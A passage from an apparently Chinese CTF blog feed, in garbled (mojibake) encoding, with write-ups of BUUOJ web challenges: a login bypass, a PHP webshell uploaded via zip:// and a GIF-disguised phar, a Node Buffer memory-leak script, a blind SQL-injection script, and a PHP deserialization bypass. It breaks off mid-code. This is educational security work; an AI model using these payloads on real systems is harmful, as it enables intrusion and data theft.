class="hljs-string">&quot;https://libs.baidu.com/jquery/1.10.2/jquery.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://ajax.aspnetcdn.com/ajax/bootstrap/4.2.1/bootstrap.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;vendor/jquery-validation/jquery.validate.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-comment">&lt;!--è¡¨å•éªŒè¯--&gt;</span></span><span class="xml">    <span class="hljs-comment">&lt;!-- Main File--&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/front.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><span class="xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php"><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&quot;secret.php&quot;</span>);</span><span class="php">mt_srand($secret_seed);</span><span class="php">$_SESSION[<span class="hljs-string">&#x27;password&#x27;</span>] = mt_rand();</span><span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre><p>secret.php</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$secret_seed = mt_rand();<span class="hljs-meta">?&gt;</span></code></pre><p>æš‚æ—¶æ²¡å‘ç°ä»€ä¹ˆï¼Œä½†æ˜¯æºç ä¸­æœ‰ä¸€ä¸ªadmin/user:</p><pre><code class="hljs oxygene">&lt;form <span class="hljs-function"><span class="hljs-keyword">method</span>=&quot;<span class="hljs-title">post</span>&quot; <span class="hljs-title">action</span>=&quot;/?<span class="hljs-title">page</span>=<span class="hljs-title">admin</span>/<span class="hljs-title">user</span>&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">form</span>-<span class="hljs-title">validate</span>&quot; <span class="hljs-title">id</span>=&quot;<span class="hljs-title">loginFrom</span>&quot;&gt;</span></code></pre><p>è¯»å–æºç å¾—åˆ°ï¼š</p><p>ç™»å½•</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);session_start();$logined = <span class="hljs-literal">false</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;username&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;<span class="hljs-keyword">if</span> ($_POST[<span class="hljs-string">&#x27;username&#x27;</span>] === <span class="hljs-string">&quot;Longlone&quot;</span> <span class="hljs-keyword">and</span> $_POST[<span class="hljs-string">&#x27;password&#x27;</span>] == $_SESSION[<span class="hljs-string">&#x27;password&#x27;</span>])&#123;  <span class="hljs-comment">// No one knows my password, including myself</span>$logined = <span class="hljs-literal">true</span>;$_SESSION[<span class="hljs-string">&#x27;status&#x27;</span>] = $logined;&#125;&#125;<span class="hljs-keyword">if</span> ($logined === <span class="hljs-literal">false</span> &amp;&amp; !<span class="hljs-keyword">isset</span>($_SESSION[<span class="hljs-string">&#x27;status&#x27;</span>]) || $_SESSION[<span class="hljs-string">&#x27;status&#x27;</span>] !== <span class="hljs-literal">true</span>)&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;username or password not correct!&#x27;);window.location.href=&#x27;index.php?page=login&#x27;;&lt;/script&gt;&quot;</span>;<span class="hljs-keyword">die</span>();&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>ä¸Šä¼ æ–‡ä»¶</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_FILES[<span class="hljs-string">&#x27;Files&#x27;</span>]) <span class="hljs-keyword">and</span> $_SESSION[<span class="hljs-string">&#x27;status&#x27;</span>] === <span class="hljs-literal">true</span>)&#123;$tmp_file = $_FILES[<span class="hljs-string">&#x27;Files&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];$tmp_path = $_FILES[<span class="hljs-string">&#x27;Files&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<span class="hljs-keyword">if</span>(($extension = pathinfo($tmp_file)[<span class="hljs-string">&#x27;extension&#x27;</span>]) != <span class="hljs-string">&quot;&quot;</span>)&#123;$allows = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;gif&#x27;</span>,<span class="hljs-string">&#x27;jpeg&#x27;</span>,<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>);<span class="hljs-keyword">if</span>(in_array($extension,$allows,<span class="hljs-literal">true</span>) <span class="hljs-keyword">and</span> in_array($_FILES[<span class="hljs-string">&#x27;Files&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>],array_map(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">$ext</span>)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;image/&#x27;</span>.$ext;&#125;,$allows),<span class="hljs-literal">true</span>))&#123;$upload_name = sha1(md5(uniqid(microtime(<span class="hljs-literal">true</span>), <span class="hljs-literal">true</span>))).<span class="hljs-string">&#x27;.&#x27;</span>.$extension;move_uploaded_file($tmp_path,<span class="hljs-string">&quot;assets/img/upload/&quot;</span>.$upload_name);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;Update image -&gt; assets/img/upload/$&#123;upload_name&#125;&#x27;) &lt;/script&gt;&quot;</span>;&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;Update illegal! Only allows like \&#x27;gif\&#x27;, \&#x27;jpeg\&#x27;, \&#x27;jpg\&#x27;, \&#x27;png\&#x27; &#x27;) &lt;/script&gt;&quot;</span>;&#125;&#125;&#125;  <span class="hljs-meta">?&gt;</span></code></pre><p>ç™»å½•é‡Œé¢</p><pre><code class="hljs nginx"><span class="hljs-attribute">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] === <span class="hljs-string">&quot;Longlone&quot;</span> and <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>] == <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;password&#x27;</span>])</code></pre><p>ç”¨æˆ·åæ˜¯å¼ºç­‰äºï¼Œå¯†ç è¦ä¸sessionå€¼ç›¸ç­‰ï¼Œä½†åœ¨login.phpé‡Œæåˆ°<code>$_SESSION['password'] = mt_rand();</code>,æˆ‘ä»¬ä¸èƒ½å¾—åˆ°seedï¼Œå½“æˆ‘ä»¬å¯ä»¥æŠŠsessionåˆ æ‰ï¼Œè®©passwdç½®ç©ºè¿™æ ·ä¹Ÿå¯ä»¥è¾¾åˆ°ç›¸ç­‰ï¼Œpasswdä¸ºå¿…é¡»ï¼Œä½†åœ¨å‰ç«¯å¯ä»¥åˆ é™¤requireï¼š</p><p><img src="/2021/08/07/hate/4.png" alt="4"></p><p>ç™»å½•åæ˜¯å‰é¢å¾—åˆ°æºç çš„é¡µé¢ï¼Œæˆ‘ä»¬å¯ä»¥ä¼ ä¸ªğŸï¼Œä½†æ˜¯æœ‰é™åˆ¶å›¾ç‰‡æ ¼å¼ï¼Œæœ€åä¼šè§£ææˆå›¾ç‰‡ï¼Œå¯ä»¥ç”¨ä¼ªåè®®ç»•è¿‡ï¼Œpharæˆ–è€…zipéƒ½å¯ä»¥ã€‚</p><h4 id="zip"><a class="header-anchor" href="#zip">ğŸ­</a>zip://</h4><p>å†™ä¸ªä¸€å¥è¯æ·»åŠ åˆ°å‹ç¼©æ–‡ä»¶ï¼Œç”Ÿæˆä¸€ä¸ª.zip ï¼Œæ”¹ä¸ªåç¼€ï¼Œ ä¸Šä¼ ï¼Œ</p><pre><code class="hljs awk">zip:<span class="hljs-regexp">//</span> + zipè·¯å¾„ + %<span class="hljs-number">23</span> + phpæ–‡ä»¶å?page=zip:<span class="hljs-regexp">//</span>assets<span class="hljs-regexp">/img/u</span>pload/xxx.jpg%<span class="hljs-number">23</span>zip<span class="hljs-comment">#index.phpåŒ…å«çš„æ—¶å€™é»˜è®¤åŠ ä¸Šäº†phpåç¼€</span></code></pre><p>èšå‰‘è¿æ¥</p><img src="/2021/08/07/hate/2.png" alt="2" style="zoom:67%;"><h4 id="phar"><a class="header-anchor" href="#phar">ğŸ­</a>phar://</h4><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Template</span></span>&#123;    <span class="hljs-keyword">public</span> $content;    <span class="hljs-keyword">public</span> $pattern;    <span class="hljs-keyword">public</span> $suffix;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$content</span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;content = $content;        <span class="hljs-keyword">$this</span>-&gt;pattern = <span class="hljs-string">&quot;/&#123;&#123;([a-z]+)&#125;&#125;/&quot;</span>;        <span class="hljs-keyword">$this</span>-&gt;suffix = <span class="hljs-string">&quot;.php&quot;</span>;    &#125;&#125;@unlink(<span class="hljs-string">&quot;zip.phar&quot;</span>);$phar = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&quot;zip.phar&quot;</span>);$phar-&gt;startBuffering();$phar-&gt;setStub(<span class="hljs-string">&quot;GIF89a&quot;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//è®¾ç½®stub, å¢åŠ gifæ–‡ä»¶å¤´ï¼Œä¼ªé€ æ–‡ä»¶ç±»å‹</span>$o = <span class="hljs-keyword">new</span> Template(<span class="hljs-string">&quot;&lt;?php @eval(\$_POST[&#x27;cmd&#x27;]);?&gt;&quot;</span>);$phar-&gt;setMetadata($o); <span class="hljs-comment">//å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest</span>$phar-&gt;addFromString(<span class="hljs-string">&quot;test.php&quot;</span>, <span class="hljs-string">&quot;&lt;?php @eval(\$_POST[&#x27;cmd&#x27;]);?&gt;&quot;</span>); <span class="hljs-comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span><span class="hljs-comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span>$phar-&gt;stopBuffering();<span class="hljs-meta">?&gt;</span></code></pre><p>è¯»å–</p><pre><code class="hljs undefined">?page&#x3D;phar:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;assets&#x2F;img&#x2F;xxx.jpg&#x2F;test</code></pre><p>å‚è€ƒï¼š<a href="https://blog.init-new-world.com/post/BUUOJ-Web-ti-mu-15.html#toc-cb8">https://blog.init-new-world.com/post/BUUOJ-Web-ti-mu-15.html#toc-cb8</a></p>]]></content>
    
    
    <categories>
      
      <category>zip è½¯é“¾æ¥</category>
      
      <category>flask-session ä¼ªé€ </category>
      
    </categories>
    
    
    <tags>
      
      <tag>zip://</tag>
      
      <tag>phar://</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>buuï¼ˆå…­ï¼‰</title>
    <link href="/2021/08/05/num/"/>
    <url>/2021/08/05/num/</url>
    
    <content type="html"><![CDATA[<h1>[HITCON 2016]Leaking</h1><p>è¿™é¢˜æœ‰ä¸ªæ–°çŸ¥è¯†ç‚¹ï¼šJSé€šè¿‡<code>Buffer</code> ç±»å¤„ç†äºŒè¿›åˆ¶æ•°æ®çš„ç¼“å†²åŒº</p><p>æºç ï¼š</p><p><img src="/2021/08/05/num/3.png" alt="3"></p><p>vm2å°±å¯ä»¥çœ‹å‡ºæ˜¯node.jsäº†ã€‚</p><h5 id="tipsï¼š"><a class="header-anchor" href="#tipsï¼š">ğŸ­</a>tipsï¼š</h5><p>åœ¨è¾ƒæ—©ä¸€ç‚¹çš„ node ç‰ˆæœ¬ä¸­ (8.0 ä¹‹å‰)ï¼Œå½“ Buffer çš„æ„é€ å‡½æ•°ä¼ å…¥æ•°å­—æ—¶, ä¼šå¾—åˆ°ä¸æ•°å­—é•¿åº¦ä¸€è‡´çš„ä¸€ä¸ª Bufferï¼Œå¹¶ä¸”è¿™ä¸ª Buffer æ˜¯æœªæ¸…é›¶çš„ã€‚8.0 ä¹‹åçš„ç‰ˆæœ¬å¯ä»¥é€šè¿‡å¦ä¸€ä¸ªå‡½æ•° Buffer.allocUnsafe(size) æ¥è·å¾—æœªæ¸…ç©ºçš„å†…å­˜ã€‚</p><p>Bufferï¼š<br>JavaScript è¯­è¨€è‡ªèº«åªæœ‰å­—ç¬¦ä¸²æ•°æ®ç±»å‹ï¼Œæ²¡æœ‰äºŒè¿›åˆ¶æ•°æ®ç±»å‹ã€‚ä½†åœ¨å¤„ç†åƒ<strong>TCPæµ</strong>æˆ–<strong>æ–‡ä»¶æµ</strong>æ—¶ï¼Œå¿…é¡»ä½¿ç”¨åˆ°äºŒè¿›åˆ¶æ•°æ®ã€‚å› æ­¤åœ¨ Node.jsä¸­ï¼Œå®šä¹‰äº†ä¸€ä¸ª Bufferç±»ï¼Œè¯¥ç±»ç”¨æ¥åˆ›å»ºä¸€ä¸ªä¸“é—¨å­˜æ”¾äºŒè¿›åˆ¶æ•°æ®çš„ç¼“å­˜åŒºã€‚åªè¦æ˜¯è°ƒç”¨è¿‡çš„å˜é‡ï¼Œä¸€å®šä¼šå­˜åœ¨å†…å­˜ä¸­ï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨<code>Buffer()</code>æ¥è¯»å–å†…å­˜ï¼Œä½¿ç”¨<code>data=Buffer(800)</code>åˆ†é…ä¸€ä¸ª<code>800</code>çš„å•ä½ä¸º<code>8</code>ä½å­—èŠ‚çš„<code>buffer</code></p><p>expï¼š</p><pre><code class="hljs apache"><span class="hljs-attribute">import</span> requests<span class="hljs-attribute">import</span> time<span class="hljs-attribute">url</span> = &#x27;http://f<span class="hljs-number">81437</span>d<span class="hljs-number">1</span>-e<span class="hljs-number">54</span>b-<span class="hljs-number">44</span>db-bc<span class="hljs-number">22</span>-<span class="hljs-number">3634</span>ab<span class="hljs-number">84</span>cd<span class="hljs-number">3</span>c.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span>/?data=Buffer(<span class="hljs-number">500</span>)&#x27;<span class="hljs-attribute">while</span> True:        <span class="hljs-attribute">r</span> = requests.get(url)        <span class="hljs-attribute">time</span>.sleep(<span class="hljs-number">0</span>.<span class="hljs-number">1</span>)        <span class="hljs-attribute">print</span>(&#x27;trying&#x27;)        <span class="hljs-attribute">if</span> &#x27;flag&#123;&#x27; in r.text:            <span class="hljs-attribute">print</span>(r.text)            <span class="hljs-attribute">break</span></code></pre><p><img src="/2021/08/05/num/4.png" alt="4"></p><p>å‚è€ƒï¼š<a href="https://bbs.huaweicloud.com/blogs/238020">https://bbs.huaweicloud.com/blogs/238020</a></p><h1>hatenum</h1><h4 id="åˆ†ææºç "><a class="header-anchor" href="#åˆ†ææºç ">ğŸ­</a>åˆ†ææºç </h4><p><img src="/2021/08/05/num/1.png" alt="1">ç™»å½•éœ€è¦ç”¨æˆ·åå¯†ç éªŒè¯ç ï¼Œä¼šå›æ˜¾ä¸‰ç§çŠ¶æ€ã€‚</p><p><img src="/2021/08/05/num/2.png" alt="2"></p><p>æ»¤äº†ä¸€ç³»åˆ—å­—ç¬¦,åŒ…æ‹¬å•å¼•å·ï¼Œé™åˆ¶å­—ç¬¦é•¿åº¦åœ¨9ä¸ªä»¥å†…ã€‚</p><h4 id="ç»•è¿‡"><a class="header-anchor" href="#ç»•è¿‡">ğŸ­</a>ç»•è¿‡</h4><p>æœ¬é¢˜åªéœ€è¦è·å–å¯†ç ï¼Œç™»å½•å³å¯ã€‚æŸ¥è¯¢è¯­å¥ï¼š</p><p><code>&quot;select * from users where username='$username' and password='$password'&quot;</code></p><p>è¿™é¢˜è·Ÿ[NCTF2019]SQLiå¾ˆåƒï¼Œä¸€æ ·çš„æŸ¥è¯¢è¯­å¥ï¼Œé™åˆ¶å°±ä¸ä¸€æ ·äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬é‡‡å–ä¸€æ ·çš„ç»•è¿‡æ–¹å¼ï¼ˆåæ–œæ è½¬ä¹‰ï¼‰</p><pre><code class="hljs routeros">select * <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>where <span class="hljs-attribute">username</span>=<span class="hljs-string">&#x27;\&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-attribute">password</span>=<span class="hljs-string">&#x27;||æ³¨å…¥è¯­å¥#&quot;</span></code></pre><h4 id="ç›²æ³¨"><a class="header-anchor" href="#ç›²æ³¨">ğŸ­</a>ç›²æ³¨</h4><p>exp()å‡½æ•°é€ æˆdoubleæ•°å€¼ç±»å‹è¶…å‡ºèŒƒå›´ï¼ˆexpæº¢å‡ºï¼‰</p><blockquote><p>MySQL exp(x)å‡½æ•° è¿”å›e(è‡ªç„¶å¯¹æ•°çš„åº•)çš„xæ¬¡æ–¹çš„å€¼ï¼Œä½†æ˜¯è¿™ä¸ªæ•°å­¦å‡½æ•°æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œé‚£å°±æ˜¯å½“ä¼ é€’ä¸€ä¸ªå¤§äº709çš„å€¼æ—¶ï¼Œå‡½æ•°exp()å°±ä¼šå¼•èµ·ä¸€ä¸ªæº¢å‡ºé”™è¯¯.</p><img src="/2021/08/05/num/8.png" alt="8" style="zoom:67%;"><p>å°†0æŒ‰ä½å–åå°±ä¼šè¿”å›â€œ18446744073709551615â€ã€‚å†åŠ ä¸Šå‡½æ•°æˆåŠŸæ‰§è¡Œåè¿”å›0çš„ç¼˜æ•…ï¼Œæˆ‘ä»¬å°†æˆåŠŸæ‰§è¡Œçš„å‡½æ•°å–åå°±ä¼šå¾—åˆ°æœ€å¤§çš„æ— ç¬¦å·BIGINTå€¼ã€‚</p><img src="/2021/08/05/num/9.png" alt="9" style="zoom:67%;"><p>é€šè¿‡å­æŸ¥è¯¢ä¸æŒ‰ä½æ±‚åï¼Œé€ æˆä¸€ä¸ªâ€œDOUBLE value is out of rangeâ€é”™è¯¯ï¼Œå¹¶å€Ÿç”±æ­¤æ³¨å‡ºæ•°æ®</p><p><img src="/2021/08/05/num/10.png" alt="10"></p><p>(æœ¬åœ°æ²¡æµ‹è¯•å‡ºæ¥ï¼Œå¯èƒ½æ˜¯é…ç½®é—®é¢˜ï¼Œdvwaä¸Šå¯ä»¥)</p></blockquote><h4 id="like-rlike-regexp"><a class="header-anchor" href="#like-rlike-regexp">ğŸ­</a>like,rlike,regexp</h4><ul><li><p>likeçš„å†…å®¹ä¸æ˜¯æ­£åˆ™ï¼Œè€Œæ˜¯é€šé…ç¬¦ã€‚</p></li><li><p>rlikeçš„å†…å®¹å¯ä»¥æ˜¯æ­£åˆ™ï¼Œæ­£åˆ™çš„å†™æ³•ä¸javaä¸€æ ·ã€‚éœ€è¦è½¬ä¹‰ï¼Œä¾‹å¦‚â€™\mâ€™éœ€è¦ä½¿ç”¨â€™\mâ€™</p></li><li><p>regexp == rlike</p></li></ul><p>æœ¬é¢˜regexpä¹Ÿè¢«banäº†ï¼Œè¿™é‡Œç”¨rlikeä»£æ›¿ã€‚</p><p>é¢˜ç›®ä¸­å¯¹hexé•¿åº¦è¿›è¡Œäº†é™åˆ¶ï¼Œéœ€å°†å­—ç¬¦è½¬ä¸ºåå…­è¿›åˆ¶ï¼ˆusernameè¿›è¡ŒåŒ¹é…çš„æ¶‰åŠadminå­—ç¬¦ä¹Ÿè¦ï¼‰ï¼Œ<strong>ä¸”æ¯ä¸‰ä½æ¨ä¸€ä½ï¼Œæœ€å¼€å§‹ä¸‰ä½é€šè¿‡<code>^</code>å’Œ<code>$</code>çš„æ–¹å¼æ¥åŒ¹é…ã€‚</strong></p><p>æ„é€ ç›²æ³¨è„šæœ¬ï¼š</p><pre><code class="hljs vim">import requests <span class="hljs-keyword">as</span> rimport <span class="hljs-built_in">string</span>url = <span class="hljs-string">&quot;http://fa57e15a-3cf4-449b-832a-120cca2c6884.node3.buuoj.cn&quot;</span><span class="hljs-keyword">pt</span> = <span class="hljs-built_in">string</span>.ascii_letters+<span class="hljs-built_in">string</span>.digits+<span class="hljs-string">&quot;$&quot;</span>   //å¯¼å…¥<span class="hljs-keyword">a</span>-<span class="hljs-keyword">z</span>,A-Z,<span class="hljs-number">0</span>-<span class="hljs-number">9</span>def str2hex(raw):    <span class="hljs-keyword">ret</span> = <span class="hljs-string">&#x27;0x&#x27;</span>    <span class="hljs-keyword">for</span> i in ra<span class="hljs-variable">w:</span>        <span class="hljs-keyword">ret</span> += hex(ord(i))[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;0&#x27;</span>)    <span class="hljs-keyword">return</span> <span class="hljs-keyword">ret</span>ans = <span class="hljs-string">&quot;&quot;</span>tmp = <span class="hljs-string">&quot;^&quot;</span><span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-number">24</span>):    <span class="hljs-keyword">for</span> ch in <span class="hljs-keyword">p</span><span class="hljs-variable">t:</span>            payload = <span class="hljs-keyword">f</span><span class="hljs-string">&quot;||1 &amp;&amp; username rlike 0x61646d &amp;&amp; exp(710-(code rlike binary &#123;str2hex(tmp+ch)&#125;))#&quot;</span>        payload = payload.replace(<span class="hljs-string">&#x27; &#x27;</span>,chr(<span class="hljs-number">0</span>x0c))        data = &#123;            <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;eki\\&quot;</span>,            <span class="hljs-string">&quot;password&quot;</span>:payload,            <span class="hljs-string">&quot;code&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>        &#125;        req = r.post(url+<span class="hljs-string">&quot;/login.php&quot;</span>,data=data,allow_redirects=False)        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;fail&#x27;</span> in req.tex<span class="hljs-variable">t:</span>            ans += ch            <span class="hljs-keyword">print</span>(tmp+ch,ans)            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(tmp) == <span class="hljs-number">3</span>:                tmp = tmp[<span class="hljs-number">1</span>:]+ch            <span class="hljs-keyword">else</span>:                tmp += ch            <span class="hljs-keyword">break</span></code></pre><p>æ‰§è¡Œ</p><img src="/2021/08/05/num/11.png" alt="11" style="zoom:50%;"><p>å°†é¡ºåºè°ƒæ¢</p><pre><code class="hljs nix">for i <span class="hljs-keyword">in</span> range(<span class="hljs-number">24</span>):    for ch <span class="hljs-keyword">in</span> pt:        <span class="hljs-attr">payload</span> = f<span class="hljs-string">&quot;||1 &amp;&amp; username rlike 0x61646d &amp;&amp; exp(710-(code rlike binary &#123;str2hex(ch+tmp)&#125;))#&quot;</span>               <span class="hljs-attr">payload</span> = payload.replace(&#x27; &#x27;,chr(<span class="hljs-number">0</span>x0c))        <span class="hljs-attr">data</span> = &#123;            <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;eki\\&quot;</span>,            <span class="hljs-string">&quot;password&quot;</span>:payload,            <span class="hljs-string">&quot;code&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>        &#125;        <span class="hljs-attr">req</span> = r.post(url+<span class="hljs-string">&quot;/login.php&quot;</span>,<span class="hljs-attr">data=data,allow_redirects=False)</span>        <span class="hljs-keyword">if</span> &#x27;fail&#x27; <span class="hljs-keyword">in</span> req.text:            <span class="hljs-attr">rev_ans</span> = ch+rev_ans            print(ch+tmp,rev_ans)            <span class="hljs-keyword">if</span> len(tmp) == <span class="hljs-number">3</span>:                <span class="hljs-attr">tmp</span> = ch+tmp[:-<span class="hljs-number">1</span>]            <span class="hljs-keyword">else</span>:                <span class="hljs-attr">tmp</span> = ch+tmp            break</code></pre><p>æ‰§è¡Œ</p><img src="/2021/08/05/num/12.png" alt="12" style="zoom:67%;"><p>ç»“åˆä¸€ä¸‹å¾—åˆ°23ä½çš„code<code>erghruigh2uygh23uiu32ig</code>ï¼Œæäº¤</p><pre><code class="hljs xl"><span class="hljs-keyword">import</span> requests url = <span class="hljs-string">&quot;http://fa57e15a-3cf4-449b-832a-120cca2c6884.node3.buuoj.cn&quot;</span><span class="hljs-keyword">data</span> = &#123;    <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin\\&quot;</span>,    <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;||1#&quot;</span>,    <span class="hljs-string">&quot;code&quot;</span>:<span class="hljs-string">&quot;erghruigh2uygh23uiu32ig&quot;</span>&#125;req = r.post(url+<span class="hljs-string">&quot;/login.php&quot;</span>,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>)print(req.<span class="hljs-keyword">text</span>)</code></pre><p>å¾—åˆ°æŠ¥æ–‡</p><p><img src="/2021/08/05/num/13.png" alt="13"></p><h1>[æå®¢å¤§æŒ‘æˆ˜ 2020]Greatphp</h1><p>åˆ†ææºç ï¼Œé¢˜ç›®ç»•è¿‡ç±»å‹å¾ˆå¸¸è§ï¼Œä¸€èˆ¬æƒ…å†µä¸‹åªéœ€è¦ä½¿ç”¨æ•°ç»„å³å¯ç»•è¿‡ï¼Œä½†æ˜¯è¿™é‡Œæ˜¯åœ¨ç±»é‡Œé¢ï¼Œä¸èƒ½è¿™ä¹ˆåšã€‚</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;    <span class="hljs-keyword">public</span> $syc;    <span class="hljs-keyword">public</span> $lover;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">if</span>( (<span class="hljs-keyword">$this</span>-&gt;syc != <span class="hljs-keyword">$this</span>-&gt;lover) &amp;&amp; (md5(<span class="hljs-keyword">$this</span>-&gt;syc) === md5(<span class="hljs-keyword">$this</span>-&gt;lover)) &amp;&amp; (sha1(<span class="hljs-keyword">$this</span>-&gt;syc)=== sha1(<span class="hljs-keyword">$this</span>-&gt;lover)) )&#123;           <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;syc, $match))&#123;               <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;syc);           &#125; <span class="hljs-keyword">else</span> &#123;               <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Try Hard !!&quot;</span>);           &#125;                   &#125;    &#125;&#125;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;great&#x27;</span>]))&#123;    unserialize($_GET[<span class="hljs-string">&#x27;great&#x27;</span>]);&#125; <span class="hljs-keyword">else</span> &#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>æˆ‘ä»¬å¯ä»¥ç”¨Errorç±»ç»•è¿‡md5å’Œsha1æ£€æµ‹</p><img src="/2021/08/05/num/5.png" alt="5" style="zoom:50%;"><p>Errorç±»ä¸­æœ‰<code>__tostring</code>æ–¹æ³•ï¼Œmd5()å’Œsha1()å‡½æ•°éƒ½ä¼šè°ƒç”¨<code>__tostring()</code>,æµ‹è¯•ä¸€ä¸‹ï¼š</p><p>å…ˆå•ä¸ªï¼š</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$a = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;payload&quot;</span>,<span class="hljs-number">1</span>);<span class="hljs-keyword">echo</span> $a;<span class="hljs-meta">?&gt;</span><span class="hljs-comment">#ç»“æœï¼šError: payload in /box/script.php:2Stack trace:#0 &#123;main&#125;</span></code></pre><p>ä¼šä»¥å­—ç¬¦ä¸²çš„å½¢å¼è¾“å‡ºå½“å‰æŠ¥é”™ï¼ŒåŒ…å«å½“å‰çš„é”™è¯¯ä¿¡æ¯ï¼ˆpayloadï¼‰ä»¥åŠå½“å‰æŠ¥é”™çš„è¡Œå·ï¼ˆ2ï¼‰ï¼Œä¼ å…¥ Error(â€œpayloadâ€,1) ä¸­çš„é”™è¯¯ä»£ç â€œ1â€åˆ™æ²¡æœ‰è¾“å‡ºå‡ºæ¥ã€‚</p><p>ä¸¤ä¸ªå‚æ•°ï¼š</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$a = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;payload&quot;</span>,<span class="hljs-number">1</span>);$b = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;payload&quot;</span>,<span class="hljs-number">2</span>);<span class="hljs-keyword">echo</span> $a;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-keyword">echo</span> 